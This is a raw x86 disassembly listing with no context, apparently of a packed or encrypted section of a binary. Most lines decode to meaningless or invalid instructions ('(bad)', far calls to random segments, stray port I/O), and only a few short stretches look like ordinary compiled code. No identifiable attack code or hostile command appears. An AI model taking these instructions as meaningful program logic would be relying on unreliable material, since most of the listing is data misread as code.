  4028c3:	aam    0x1c
  4028c5:	mov    esp,0x9aa7a55
  4028ca:	rcr    BYTE PTR [ecx-0x56],cl
  4028cd:	xchg   edx,eax
  4028ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028cf:	mov    ebp,0xc0cd27cf
  4028d4:	pop    es
  4028d5:	pop    esi
  4028d6:	sar    BYTE PTR [ebp+0x2b],cl
  4028d9:	fimul  WORD PTR [eax]
  4028db:	bound  ebp,QWORD PTR [ebp-0x690ada31]
  4028e1:	xor    ebp,ebp
  4028e3:	pop    es
  4028e4:	pop    ebp
  4028e5:	pop    DWORD PTR [edi]
  4028e7:	test   BYTE PTR [edx+0x66cd8bda],ah
  4028ed:	or     eax,0x7ab8ae42
  4028f2:	or     eax,0x3804a012
  4028f7:	jmp    0x4028e4
  4028f9:	arpl   WORD PTR [eax],bx
  4028fb:	retf   
  4028fc:	push   ds
  4028fd:	xchg   ecx,esp
  4028ff:	push   esi
  402900:	dec    esp
  402901:	xor    al,0x6d
  402903:	shl    BYTE PTR [esp+ecx*4],0x17
  402907:	sar    DWORD PTR [ecx],0x44
  40290a:	std    
  40290b:	inc    esi
  40290c:	mov    ch,0x7d
  40290e:	pop    esi
  40290f:	adc    eax,DWORD PTR [ebx+esi*4-0xd]
  402913:	add    al,0x8c
  402915:	sbb    dl,BYTE PTR [eax+0x60a4336f]
  40291b:	push   ebp
  40291c:	and    eax,0x1a60258b
  402921:	xchg   BYTE PTR ds:0x6a61d6df,dh
  402927:	and    eax,0x1c79a3eb
  40292c:	mov    bl,al
  40292e:	fwait
  40292f:	int3   
  402930:	pop    esi
  402931:	cdq    
  402932:	xlat   BYTE PTR ds:[ebx]
  402933:	sbb    dl,BYTE PTR [ecx+ebx*1-0x3284fa27]
  40293a:	call   0xca84:0x69b838d8
  402941:	inc    ebp
  402942:	test   cl,bh
  402944:	mov    cl,0x3b
  402946:	pop    esi
  402947:	cmp    esi,esp
  402949:	push   cs
  40294a:	int    0xb
  40294c:	fbld   TBYTE PTR [ecx+0x70130033]
  402952:	add    ebp,DWORD PTR [esi]
  402954:	hlt    
  402955:	ret    0x9b45
  402958:	push   esp
  402959:	ret    0x36d
  40295c:	adc    BYTE PTR [eax-0x50],cl
  40295f:	ss inc eax
  402961:	inc    esp
  402962:	outs   dx,DWORD PTR ds:[esi]
  402963:	outs   dx,BYTE PTR ds:[esi]
  402964:	test   al,0xfa
  402966:	xchg   ecx,eax
  402967:	es std 
  402969:	(bad)  
  40296a:	lahf   
  40296b:	xchg   edi,eax
  40296c:	int3   
  40296d:	test   bl,al
  40296f:	ja     0x402958
  402971:	jmp    0x402998
  402973:	sub    DWORD PTR [esi+0x1b],edx
  402976:	and    eax,0xde408d0e
  40297b:	retf   0x772e
  40297e:	push   ss
  40297f:	pop    esp
  402980:	fsubr  QWORD PTR [edx+0x52]
  402983:	dec    ebx
  402984:	mov    edx,0x659d3e1c
  402989:	pusha  
  40298a:	iret   
  40298b:	test   al,0xb8
  40298d:	dec    eax
  40298e:	rcl    DWORD PTR [edx-0x4a],1
  402991:	adc    ebx,0xfffffff0
  402994:	sbb    BYTE PTR [eax+0x4650ebe8],0x56
  40299b:	lods   al,BYTE PTR ds:[esi]
  40299c:	retf   
  40299d:	clc    
  40299e:	jmp    0x4029ca
  4029a0:	shl    DWORD PTR [edi-0x3ebd0740],0x9c
  4029a7:	test   al,0x5
  4029a9:	and    bl,BYTE PTR [edi-0x5b]
  4029ac:	inc    eax
  4029ad:	xchg   esp,eax
  4029ae:	pop    edi
  4029af:	(bad)  
  4029b0:	sub    eax,0x667d576a
  4029b5:	in     eax,dx
  4029b6:	mov    ebx,0xa94a790e
  4029bb:	sbb    eax,0x810dca77
  4029c0:	mov    bh,0x80
  4029c2:	and    ecx,DWORD PTR [ebx]
  4029c4:	loope  0x402a3f
  4029c6:	ret    
  4029c7:	inc    ecx
  4029c8:	push   0xffffffe2
  4029ca:	dec    ebx
  4029cb:	fcmovnu st,st(5)
  4029cd:	xchg   ebx,eax
  4029ce:	test   BYTE PTR [ecx-0x5f],al
  4029d1:	pop    ds
  4029d2:	add    eax,0xc6befa7b
  4029d7:	mov    ebx,0x7f07fd66
  4029dc:	sub    BYTE PTR [edi],dl
  4029de:	int3   
  4029df:	xchg   ecx,eax
  4029e0:	xor    dh,dh
  4029e2:	arpl   dx,ax
  4029e4:	push   esi
  4029e5:	sub    BYTE PTR [ebx+0x39],ch
  4029e8:	mov    ch,0x12
  4029ea:	iret   
  4029eb:	xor    DWORD PTR ds:0x2f3a8045,eax
  4029f1:	and    ch,bh
  4029f3:	mov    eax,0x13363165
  4029f8:	mov    edx,0xc39e5222
  4029fd:	mov    bh,0xd7
  4029ff:	mov    esp,0x765769bb
  402a04:	(bad)  
  402a05:	clc    
  402a06:	add    ebp,DWORD PTR [esi-0x16]
  402a09:	push   0x1a3b46cd
  402a0e:	mov    eax,0x813c2d03
  402a13:	mov    bh,0x1b
  402a15:	jae    0x402a29
  402a17:	ja     0x402a27
  402a19:	sbb    esi,DWORD PTR [eax-0x18]
  402a1c:	lock aad 0x84
  402a1f:	adc    BYTE PTR [eax-0x74238c7c],dh
  402a25:	xchg   esi,eax
  402a26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a27:	jo     0x402a04
  402a29:	or     eax,0x2ca0a61c
  402a2e:	pop    ss
  402a2f:	ins    BYTE PTR es:[edi],dx
  402a30:	or     ebp,esi
  402a32:	repz push edx
  402a34:	or     ebx,DWORD PTR [ebp+0x67c8dc02]
  402a3a:	add    esp,ebx
  402a3c:	mov    ecx,0x33fd6b7d
  402a41:	push   ss
  402a42:	test   eax,0xa63f74ec
  402a47:	or     eax,0xd3bb4979
  402a4c:	inc    ebp
  402a4d:	bound  edi,QWORD PTR [esi+eiz*4-0x48d878bd]
  402a54:	pusha  
  402a55:	and    al,0x13
  402a57:	pop    esi
  402a58:	ja     0x402a68
  402a5a:	push   es
  402a5b:	fdecstp 
  402a5d:	pop    esp
  402a5e:	cs dec edx
  402a60:	inc    edx
  402a61:	jno    0x402a82
  402a63:	pop    ebx
  402a64:	and    DWORD PTR [ebp-0x532f47f5],ebp
  402a6a:	jle    0x402a18
  402a6c:	sbb    bh,cl
  402a6e:	and    esp,DWORD PTR [eax+edx*1]
  402a71:	fadd   QWORD PTR [ebp+0x15]
  402a75:	push   ebp
  402a76:	fcom   QWORD PTR [ebx+0x6b]
  402a79:	test   al,0x5f
  402a7b:	shl    BYTE PTR [ecx-0x56],cl
  402a7e:	cld    
  402a7f:	addr16 dec ebx
  402a81:	mov    ds:0x154a619c,al
  402a86:	push   ebx
  402a87:	stos   BYTE PTR es:[edi],al
  402a88:	push   es
  402a89:	push   ebp
  402a8a:	push   esi
  402a8b:	adc    edx,DWORD PTR [ebp-0x2d]
  402a8e:	in     eax,dx
  402a8f:	sbb    al,0x9c
  402a91:	ret    
  402a92:	pop    es
  402a93:	mov    bl,0x93
  402a95:	pusha  
  402a96:	into   
  402a97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a98:	jmp    0xe3a4:0x7175c7cb
  402a9f:	pop    ss
  402aa0:	add    al,0x5c
  402aa2:	xchg   ebx,eax
  402aa3:	in     al,dx
  402aa4:	shl    DWORD PTR [edi+0x75],cl
  402aa7:	stos   DWORD PTR es:[edi],eax
  402aa8:	shl    esi,cl
  402aaa:	cmp    al,0x2f
  402aac:	ficomp DWORD PTR [edx+0x3576c909]
  402ab2:	xchg   edx,eax
  402ab3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ab4:	mov    DWORD PTR [esi+esi*4+0x4f42743f],edi
  402abb:	in     eax,0x53
  402abd:	punpcklwd mm7,mm3
  402ac0:	mov    dh,0x17
  402ac2:	xchg   esp,eax
  402ac3:	mov    edi,0x807ad80c
  402ac8:	out    dx,al
  402ac9:	pop    esp
  402aca:	(bad)  
  402acb:	or     DWORD PTR es:[esi+eiz*2-0x54],esp
  402ad0:	pop    ebx
  402ad1:	aas    
  402ad2:	xchg   ebx,eax
  402ad3:	xchg   esi,eax
  402ad4:	xchg   edi,eax
  402ad5:	lods   eax,DWORD PTR ds:[esi]
  402ad6:	mov    ch,0x51
  402ad8:	mov    ds:0xb9aaae06,al
  402add:	or     DWORD PTR [ebp+0x6b0d60ca],edx
  402ae3:	sti    
  402ae4:	call   0xa8af:0x5d24319c
  402aeb:	adc    dh,BYTE PTR [ecx+edi*1-0x5b]
  402aef:	adc    ecx,ebx
  402af1:	add    al,0x5f
  402af3:	sub    DWORD PTR [esi],eax
  402af5:	sub    eax,0x5f11fafb
  402afa:	es ins BYTE PTR es:[edi],dx
  402afc:	test   BYTE PTR [ecx-0x4b330451],bh
  402b02:	fwait
  402b03:	mov    ds,WORD PTR [ebx+esi*2-0x25]
  402b07:	cwde   
  402b08:	push   ecx
  402b09:	call   0x365d6487
  402b0e:	sub    DWORD PTR [ebx],ebp
  402b10:	enter  0x9ae9,0x2
  402b14:	add    BYTE PTR [eax],al
  402b16:	ror    al,0xc2
  402b19:	int    0xda
  402b1b:	rcr    ebx,1
  402b1d:	aad    0x7b
  402b1f:	bound  ebp,QWORD PTR [esi+0x37]
  402b22:	jecxz  0x402ad9
  402b24:	mov    ah,0xb8
  402b26:	mov    ss,WORD PTR [edx]
  402b28:	js     0x402ba2
  402b2a:	(bad)  
  402b2b:	jle    0x402ba5
  402b2d:	js     0x402b1c
  402b2f:	sbb    al,0xe9
  402b31:	or     ch,bl
  402b33:	and    bl,cl
  402b35:	jo     0x402b51
  402b37:	sub    BYTE PTR [ebx-0x2dff6d0d],bl
  402b3d:	(bad)  
  402b3e:	dec    edi
  402b3f:	mov    al,0xa3
  402b41:	outs   dx,BYTE PTR ds:[esi]
  402b42:	jl     0x402b4d
  402b44:	bound  ebp,QWORD PTR es:[ebx+eiz*8-0x7]
  402b49:	sub    eax,edx
  402b4b:	ficom  WORD PTR [ebx]
  402b4d:	lods   eax,DWORD PTR ds:[esi]
  402b4e:	jne    0x402ae7
  402b50:	cli    
  402b51:	rol    cl,cl
  402b53:	loope  0x402b61
  402b55:	push   edi
  402b56:	xor    eax,0x2cbed5e3
  402b5b:	pop    edx
  402b5c:	mov    WORD PTR [edx+ecx*2-0x7e3db921],gs
  402b63:	pop    ebp
  402b64:	sbb    eax,0x652f0d7e
  402b69:	dec    ebp
  402b6a:	imul   ebx,DWORD PTR [edx+0x76],0xffffff9f
  402b6e:	mov    ah,0xbb
  402b70:	dec    eax
  402b71:	jo     0x402ba3
  402b73:	ret    
  402b74:	outs   dx,DWORD PTR ds:[esi]
  402b75:	out    dx,eax
  402b76:	adc    BYTE PTR [ecx+0x78],0xa6
  402b7a:	fidivr DWORD PTR [ebx]
  402b7c:	sbb    cl,0x94
  402b7f:	add    BYTE PTR [ecx-0x47c47a87],dl
  402b85:	dec    edi
  402b86:	(bad)
  402b89:	stc    
  402b8a:	pop    ds
  402b8b:	pop    ds
  402b8c:	stos   BYTE PTR es:[edi],al
  402b8d:	mov    ebp,gs
  402b8f:	jmp    0x402b90
  402b91:	stc    
  402b92:	push   ebp
  402b93:	int3   
  402b94:	xor    BYTE PTR [ebp+0x25564660],ch
  402b9a:	out    dx,eax
  402b9b:	fcomi  st,st(1)
  402b9d:	out    dx,al
  402b9e:	push   es
  402b9f:	nop
  402ba0:	dec    esi
  402ba1:	add    BYTE PTR [ebx],bh
  402ba3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ba4:	mov    edx,fs
  402ba6:	ret    0xf729
  402ba9:	in     eax,0x58
  402bab:	lods   eax,DWORD PTR ds:[esi]
  402bac:	fadd   st(4),st
  402bae:	jl     0x402bb8
  402bb0:	hlt    
  402bb1:	or     al,0x60
  402bb3:	nop
  402bb4:	xor    DWORD PTR [esp+ebx*2+0x1213c49f],edx
  402bbb:	and    DWORD PTR [edx+eax*1-0x731f0e2],esi
  402bc2:	fidiv  DWORD PTR [esi-0xa]
  402bc5:	lahf   
  402bc6:	inc    edi
  402bc7:	sub    BYTE PTR [ebx-0x5f0a9c96],bh
  402bcd:	xchg   dh,ah
  402bcf:	lahf   
  402bd0:	jl     0x402b92
  402bd2:	shr    BYTE PTR [esi-0x3630f539],1
  402bd8:	stos   BYTE PTR es:[edi],al
  402bd9:	mov    cl,0x1d
  402bdb:	mov    al,0x86
  402bdd:	in     eax,dx
  402bde:	call   0xeceb512d
  402be3:	std    
  402be4:	or     eax,0x369543c6
  402be9:	addr16 and eax,0x90410b90
  402bef:	xlat   BYTE PTR ds:[ebx]
  402bf0:	jb     0x402c3e
  402bf2:	js     0x402bbf
  402bf4:	push   0xffffffe7
  402bf6:	sbb    edi,0x468cbec1
  402bfc:	pop    ecx
  402bfd:	pusha  
  402bfe:	sub    ch,BYTE PTR [edx]
  402c00:	jmp    0x4a580106
  402c05:	cmp    bh,BYTE PTR [eax+0x2a02584c]
  402c0b:	push   0xffffffbf
  402c0d:	mov    ebx,0x23954159
  402c12:	adc    DWORD PTR [ecx+0x1],edx
  402c15:	out    0xa7,al
  402c17:	and    dl,cl
  402c19:	fcomp  DWORD PTR [ebp+edx*2+0x64]
  402c1d:	push   0x43a48ccb
  402c22:	pop    esi
  402c23:	cmp    al,0xb
  402c25:	fwait
  402c26:	mov    ah,0x80
  402c28:	sub    eax,0xabd0f243
  402c2d:	push   ecx
  402c2e:	dec    ebx
  402c2f:	daa    
  402c30:	(bad)  
  402c31:	mov    dh,0x20
  402c33:	(bad)  
  402c34:	fst    DWORD PTR [eax]
  402c36:	(bad)  
  402c37:	cli    
  402c38:	jno    0x402bc3
  402c3a:	rcr    DWORD PTR [eax+0x11bc8e7f],1
  402c40:	push   0xbecd7f1c
  402c45:	mov    al,0xbd
  402c47:	test   bh,bh
  402c49:	lods   eax,DWORD PTR ds:[esi]
  402c4a:	addr16 into 
  402c4c:	in     eax,0x31
  402c4e:	xchg   edx,eax
  402c4f:	push   edx
  402c50:	pop    eax
  402c51:	loopne 0x402c1a
  402c53:	dec    esp
  402c54:	dec    edx
  402c55:	mov    ebx,0xb277a88c
  402c5a:	mov    ss,WORD PTR [edx-0x1a1e8e92]
  402c60:	push   ds
  402c61:	shr    DWORD PTR [edi],cl
  402c63:	ja     0x402c9b
  402c65:	adc    eax,0x9460ea6e
  402c6a:	out    dx,eax
  402c6b:	push   0x8b5370f6
  402c70:	int3   
  402c71:	xchg   DWORD PTR [edx-0x3322652e],edi
  402c77:	sub    edx,DWORD PTR ds:0x247a1e26
  402c7d:	mov    ecx,0x9de36686
  402c82:	cmc    
  402c83:	ja     0x402c63
  402c85:	enter  0xd5e3,0xb7
  402c89:	push   ds
  402c8a:	push   ds
  402c8b:	jge    0x402c7f
  402c8d:	aad    0xc1
  402c8f:	sbb    eax,0xce28557
  402c94:	dec    esi
  402c95:	and    eax,0xe5ec232a
  402c9a:	mov    esp,0xf53975e7
  402c9f:	push   edi
  402ca0:	xchg   edi,eax
  402ca1:	push   eax
  402ca2:	mov    dh,0x91
  402ca4:	leave  
  402ca5:	cdq    
  402ca6:	lahf   
  402ca7:	pop    esp
  402ca8:	pusha  
  402ca9:	jnp    0x402d1a
  402cab:	push   esp
  402cac:	ss xchg edx,eax
  402cae:	pop    ebx
  402caf:	mov    ecx,0xf72335c2
  402cb4:	mov    DWORD PTR [ebx],0x5118f625
  402cba:	mov    bl,0x20
  402cbc:	add    BYTE PTR [ecx-0x6a619ae2],al
  402cc2:	les    esp,FWORD PTR [esi-0x5d]
  402cc5:	mov    esp,0x7e718d69
  402cca:	pop    es
  402ccb:	push   0xa
  402ccd:	jge    0x402d40
  402ccf:	lock cmp BYTE PTR [edi-0x2fe1b697],ah
  402cd6:	mov    esp,0xba1399fb
  402cdb:	fst    QWORD PTR [eax+0x783314f5]
  402ce1:	lock scas eax,DWORD PTR es:[edi]
  402ce3:	xor    al,0x3b
  402ce5:	add    al,0x29
  402ce7:	and    cl,BYTE PTR [ebx]
  402ce9:	and    DWORD PTR ds:0xd60e477e,0x7241c129
  402cf3:	add    al,0x97
  402cf5:	mov    esp,0xf7a79348
  402cfa:	push   edi
  402cfb:	xor    BYTE PTR [ecx],al
  402cfd:	dec    edx
  402cfe:	mov    WORD PTR [eax-0x43],es
  402d01:	inc    ecx
  402d02:	loop   0x402d71
  402d04:	inc    eax
  402d05:	dec    ebp
  402d06:	mov    WORD PTR [eax-0x6b015c8f],ds
  402d0c:	sbb    BYTE PTR [eax],0x85
  402d0f:	adc    ecx,DWORD PTR [esi+0x40b2ea6]
  402d15:	shl    esp,0x9e
  402d18:	and    al,0x80
  402d1a:	mov    esi,0xbde55781
  402d1f:	xlat   BYTE PTR ds:[ebx]
  402d20:	mov    dh,0x7b
  402d22:	cmp    BYTE PTR [eax],0x8d
  402d25:	jae    0x402cd7
  402d27:	(bad)  
  402d28:	xchg   ebx,eax
  402d29:	fs or  al,BYTE PTR cs:[edx-0x68c97fe6]
  402d31:	cmp    al,0x28
  402d33:	push   cs
  402d34:	stos   DWORD PTR es:[edi],eax
  402d35:	pop    ss
  402d36:	arpl   WORD PTR [edx+0x15ca1533],bp
  402d3c:	fcomp  DWORD PTR [eax]
  402d3e:	mov    ebx,0xc852944e
  402d43:	cdq    
  402d44:	repnz xor ecx,DWORD PTR [ecx]
  402d47:	cmp    BYTE PTR [edi],dh
  402d49:	inc    edi
  402d4a:	stos   DWORD PTR es:[edi],eax
  402d4b:	sahf   
  402d4c:	ret    
  402d4d:	fisttp WORD PTR [esi-0x9a26763]
  402d53:	ja     0x402d35
  402d55:	in     al,dx
  402d56:	and    DWORD PTR [eax-0x16],eax
  402d59:	repz dec ecx
  402d5b:	fs mov cl,0xf6
  402d5e:	pop    eax
  402d5f:	retf   
  402d60:	hlt    
  402d61:	retf   0x1129
  402d64:	lods   al,BYTE PTR ds:[esi]
  402d65:	or     eax,0x3a850040
  402d6a:	ficom  WORD PTR [ebp+0x3990929]
  402d70:	aam    0x13
  402d72:	cmp    dl,BYTE PTR [ecx]
  402d74:	psrlq  mm1,QWORD PTR [eax-0x80]
  402d78:	lods   eax,DWORD PTR ds:[esi]
  402d79:	sub    al,0xfc
  402d7b:	xlat   BYTE PTR ds:[ebx]
  402d7c:	mov    ds:0xd4c72b97,al
  402d81:	pop    esi
  402d82:	in     al,dx
  402d83:	mov    DWORD PTR [eax],0x4f63c52c
  402d89:	and    DWORD PTR [eax],edx
  402d8b:	shl    BYTE PTR [edx],1
  402d8d:	test   DWORD PTR [ecx+eax*8],eax
  402d90:	sbb    dl,BYTE PTR [esi]
  402d92:	out    0x60,al
  402d94:	imul   ebp,DWORD PTR [ebx],0x90b3cd4c
  402d9a:	pushf  
  402d9b:	dec    DWORD PTR [ecx+0x71959a9a]
  402da1:	mov    BYTE PTR [esi+ebx*8-0x4f],cl
  402da5:	jns    0x402da5
  402da7:	push   0x7ea09996
  402dac:	jne    0x402de4
  402dae:	lea    edx,[ebx+ebp*1+0x4d8966cf]
  402db5:	cld    
  402db6:	jmp    0x402dc8
  402dbb:	xor    eax,esi
  402dbd:	lea    eax,[eax+ecx*1+0x327298]
  402dc4:	mov    WORD PTR [ebp-0x4],ax
  402dc8:	mov    eax,DWORD PTR [ebp-0xc]
  402dcb:	cmp    eax,ebx
  402dcd:	je     0x403080
  402dd3:	mov    eax,DWORD PTR [ebp-0x8]
  402dd6:	mov    DWORD PTR [eax],0x60341eb0
  402ddc:	jmp    0x404380
  402de1:	jmp    0x403080
  402de6:	(bad)  
  402de7:	leave  
  402de8:	(bad)  
  402de9:	vpsubusw xmm2,xmm4,xmm5
  402ded:	leave  
  402dee:	repnz int 0x29
  402df1:	cld    
  402df2:	and    ebx,DWORD PTR [ebp+0x38]
  402df5:	(bad)  [edi+edx*1]
  402df8:	js     0x402e72
  402dfa:	(bad)  
  402dfb:	jle    0x402e75
  402dfd:	js     0x402e62
  402dff:	jns    0x402e15
  402e01:	sbb    ch,BYTE PTR [edx]
  402e03:	sbb    dh,BYTE PTR [edi-0x410f4f8a]
  402e09:	repz jnp 0x402dcb
  402e0c:	or     esp,DWORD PTR ds:0xfcb08db4
  402e12:	jg     0x402df5
  402e14:	popa   
  402e15:	mov    ecx,0x219703b
  402e1a:	pop    es
  402e1b:	mov    esp,0xa697b26b
  402e20:	pop    edx
  402e21:	push   edx
  402e22:	push   esi
  402e23:	sub    al,0xb8
  402e25:	sub    eax,0x9966abdc
  402e2a:	sub    DWORD PTR [ebp-0x5d],ebx
  402e2d:	ins    BYTE PTR es:[edi],dx
  402e2e:	sub    bl,BYTE PTR [edx]
  402e30:	push   0xffffff9c
  402e32:	sub    al,0x2
  402e34:	ss mov eax,0x3c0008e9
  402e3a:	push   esp
  402e3b:	or     al,bl
  402e3d:	inc    edi
  402e3e:	fisubr DWORD PTR [eax]
  402e40:	retf   0x5e1d
  402e43:	mov    bh,0xeb
  402e45:	popf   
  402e46:	and    DWORD PTR ds:0xa1cf6b23,ebp
  402e4c:	lahf   
  402e4d:	fld    DWORD PTR [ebx+0x7fb2fe82]
  402e53:	lea    esi,[esi]
  402e55:	jmp    0xe4cd10bd
  402e5a:	shl    ebp,1
  402e5c:	retf   
  402e5d:	add    al,0xf6
  402e5f:	jo     0x402e55
  402e61:	ja     0x402ecd
  402e63:	xchg   ecx,eax
  402e64:	jb     0x402e19
  402e66:	retf   0x188e
  402e69:	mov    ebx,0x63046a25
  402e6e:	lods   al,BYTE PTR ds:[esi]
  402e6f:	jge    0x402edb
  402e71:	fwait
  402e72:	push   0x270cfb53
  402e77:	jmp    0x402e2d
  402e79:	int    0xec
  402e7b:	dec    edi
  402e7c:	pop    esi
  402e7d:	retf   
  402e7e:	and    ch,ah
  402e80:	push   0x5be48839
  402e85:	add    DWORD PTR [esi-0xe],esi
  402e88:	or     al,0x73
  402e8a:	mov    dh,0x46
  402e8c:	into   
  402e8d:	enter  0x828e,0xaf
  402e91:	mov    dh,0xa1
  402e93:	cmp    al,0xcf
  402e95:	lahf   
  402e96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e97:	mov    edx,0x6379476
  402e9c:	shl    BYTE PTR [edi+0x16],0xfe
  402ea0:	mov    dl,0xde
  402ea2:	lods   eax,DWORD PTR ds:[esi]
  402ea3:	mov    bh,0x78
  402ea5:	pop    edx
  402ea6:	fwait
  402ea7:	or     BYTE PTR [ecx-0x7ed6048a],0x52
  402eae:	setg   BYTE PTR [ebp+0x4e9ccc5a]
  402eb5:	scas   eax,DWORD PTR es:[edi]
  402eb6:	lock fnstenv [edi+0x1c]
  402eba:	sti    
  402ebb:	fs iretw 
  402ebe:	xor    eax,0xeaf2627d
  402ec3:	push   es
  402ec4:	jge    0x402ec6
  402ec6:	sbb    al,0x26
  402ec8:	pop    ss
  402ec9:	mov    DWORD PTR [ebp-0x2051f544],0x3f4e1c8b
  402ed3:	std    
  402ed4:	ds retf 
  402ed6:	call   0x58f2c583
  402edb:	jmp    0x9d0ebcff
  402ee0:	sub    dh,BYTE PTR [edx-0x6117d008]
  402ee6:	test   DWORD PTR [eax+0x2f728e7e],ebx
  402eec:	mov    al,ds:0x3d473a82
  402ef1:	pop    edi
  402ef2:	lahf   
  402ef3:	nop
  402ef4:	fld    TBYTE PTR [ebp+0x4]
  402ef7:	std    
  402ef8:	sub    ch,BYTE PTR [esi+0x4a504ad1]
  402efe:	lock in eax,dx
  402f00:	test   eax,0x949b023f
  402f05:	push   eax
  402f06:	lahf   
  402f07:	cmp    eax,0x20256796
  402f0c:	jg     0x402f3e
  402f0e:	es jl  0x402f62
  402f11:	fidiv  DWORD PTR ds:0xc46ef644
  402f17:	fdivr  QWORD PTR [ecx-0x27]
  402f1a:	data16 add ah,BYTE PTR [edi]
  402f1d:	(bad)  
  402f1e:	cld    
  402f1f:	mov    ah,0xb7
  402f21:	cmp    BYTE PTR [edi-0x61],al
  402f24:	adc    eax,0x8f9606f6
  402f29:	fisubr WORD PTR [edx+0x6d]
  402f2c:	xlat   BYTE PTR ds:[ebx]
  402f2d:	or     eax,0x6382672c
  402f32:	inc    ebx
  402f33:	mov    bh,ah
  402f35:	cmp    al,0x67
  402f37:	sbb    al,0xfa
  402f39:	and    eax,0xae8d343c
  402f3e:	cmp    al,0x93
  402f40:	xchg   edi,eax
  402f41:	jae    0x402f28
  402f43:	and    bl,BYTE PTR ds:0x7e619f32
  402f49:	xor    BYTE PTR [ebp+esi*1+0x4c1a3ff6],ch
  402f50:	retf   
  402f51:	ror    DWORD PTR [ebx+edx*4],1
  402f54:	imul   ecx,DWORD PTR [ecx],0xf738673a
  402f5a:	inc    esi
  402f5b:	adc    DWORD PTR [esi+eax*2+0x78],esp
  402f5f:	out    0x8a,eax
  402f61:	mov    edx,0x2a661b45
  402f66:	repnz pop edx
  402f68:	cmp    al,0x23
  402f6a:	sub    al,0xb5
  402f6c:	nop
  402f6d:	test   ecx,edx
  402f6f:	jle    0x402f5a
  402f71:	or     ebp,DWORD PTR [ebx]
  402f73:	aas    
  402f74:	or     BYTE PTR [ebp-0x23],dh
  402f77:	sti    
  402f78:	sbb    esp,esi
  402f7a:	mov    edi,0xbb5bc66a
  402f7f:	outs   dx,DWORD PTR ds:[esi]
  402f80:	jnp    0x402f1a
  402f82:	xchg   bl,al
  402f84:	cmp    al,0x13
  402f86:	ret    
  402f87:	adc    BYTE PTR [ecx+0x505b564d],cl
  402f8d:	ret    0x5bad
  402f90:	cwde   
  402f91:	dec    ebp
  402f92:	test   eax,0x66e549f8
  402f97:	adc    bl,bl
  402f99:	jno    0x402fa5
  402f9b:	xor    eax,0xbc76d3ac
  402fa0:	add    cl,BYTE PTR [eax+0x4c53511d]
  402fa6:	mov    edx,ebp
  402fa8:	dec    edi
  402fa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402faa:	lods   eax,DWORD PTR ds:[esi]
  402fab:	ins    BYTE PTR es:[edi],dx
  402fac:	push   esp
  402fad:	sbb    BYTE PTR ds:0x58e4b8a9,dl
  402fb3:	inc    ecx
  402fb4:	retf   
  402fb5:	xchg   edx,eax
  402fb6:	je     0x402fd9
  402fb8:	les    ecx,FWORD PTR [edx]
  402fba:	sbb    BYTE PTR [edi-0x2d7ec522],0x76
  402fc1:	dec    ecx
  402fc2:	cmp    DWORD PTR [esp-0x58],esp
  402fc6:	aam    0x6e
  402fc8:	xor    DWORD PTR [ebp+edi*8-0x79b790c3],0x12
  402fd0:	cmp    ebx,ebx
  402fd2:	add    eax,0x7984d865
  402fd7:	dec    edx
  402fd8:	push   es
  402fd9:	int    0x49
  402fdb:	adc    eax,0xd2f25b8f
  402fe0:	jbe    0x403054
  402fe2:	xlat   BYTE PTR ds:[ebx]
  402fe3:	jo     0x403058
  402fe5:	xor    cl,BYTE PTR ds:[ebp+eiz*2-0xa]
  402fea:	sub    BYTE PTR [edx-0x566c7e12],al
  402ff0:	jno    0x402fa0
  402ff2:	test   eax,0x2c33b3d1
  402ff7:	push   eax
  402ff8:	mov    ch,0xa6
  402ffa:	jo     0x403071
  402ffc:	jbe    0x402fa2
  402ffe:	js     0x403055
  403000:	pop    esi
  403001:	rep lods al,BYTE PTR ds:[esi]
  403003:	push   edx
  403004:	dec    ecx
  403005:	in     eax,0xc7
  403007:	outs   dx,DWORD PTR ds:[esi]
  403008:	add    al,0x2f
  40300a:	cdq    
  40300b:	shr    BYTE PTR [ebp+0x7f],1
  40300e:	sbb    eax,0x442a2ef4
  403013:	mov    bh,0x7c
  403015:	mov    ds:0x30257dbc,eax
  40301a:	or     ecx,DWORD PTR [ecx+edi*1-0x2906ceae]
  403021:	cli    
  403022:	and    DWORD PTR [ecx+0x1e8a91f9],esp
  403028:	ja     0x402fc2
  40302a:	repnz fcom DWORD PTR [ebx+edx*2+0x4b84f7f1]
  403032:	xchg   edi,eax
  403033:	jae    0x403070
  403035:	xlat   BYTE PTR ds:[ebx]
  403036:	idiv   cl
  403038:	loop   0x40301a
  40303a:	rcl    DWORD PTR [edx-0x23],0xe3
  40303e:	pop    eax
  40303f:	add    al,0x19
  403041:	jae    0x403005
  403043:	sbb    bh,BYTE PTR [edx-0x35]
  403046:	lock and dl,BYTE PTR [esi]
  403049:	fwait
  40304a:	jb     0x403051
  40304c:	or     cl,BYTE PTR [edi+0x2f]
  40304f:	addr16 jle 0x4030ac
  403052:	loope  0x402ffb
  403054:	cmp    ebx,DWORD PTR [edi+0x2e]
  403057:	imul   esp,DWORD PTR [esi+0x22],0x5b075780
  40305e:	xor    ebp,DWORD PTR [ebx]
  403060:	pushf  
  403061:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403062:	mov    bh,0x7a
  403064:	push   ebp
  403065:	sar    BYTE PTR [esi-0x65],1
  403068:	dec    edi
  403069:	lahf   
  40306a:	outs   dx,DWORD PTR ds:[esi]
  40306b:	cmc    
  40306c:	sub    BYTE PTR [ebp+0x19],0x86
  403070:	dec    edx
  403071:	adc    bh,ah
  403073:	(bad)  
  403074:	pop    ecx
  403075:	jle    0x40301a
  403077:	shr    BYTE PTR [eax-0x61],cl
  40307a:	fsubp  st(6),st
  40307c:	push   esi
  40307d:	xor    al,0xcd
  40307f:	pop    esp
  403080:	mov    eax,DWORD PTR [ebp+0x8]
  403083:	mov    ecx,DWORD PTR [ebp-0x8]
  403086:	jmp    0x403325
  40308b:	ror    esp,1
  40308d:	ror    edx,1
  40308f:	ror    ecx,1
  403091:	(bad)  
  403093:	test   al,0x59
  403095:	xchg   ebx,eax
  403096:	push   edx
  403097:	push   esi
  403098:	rcr    ebp,0x4e
  40309b:	xchg   edx,eax
  40309c:	adc    eax,0x7efe7878
  4030a1:	js     0x40311b
  4030a3:	sub    ebx,ebp
  4030a5:	push   0x1
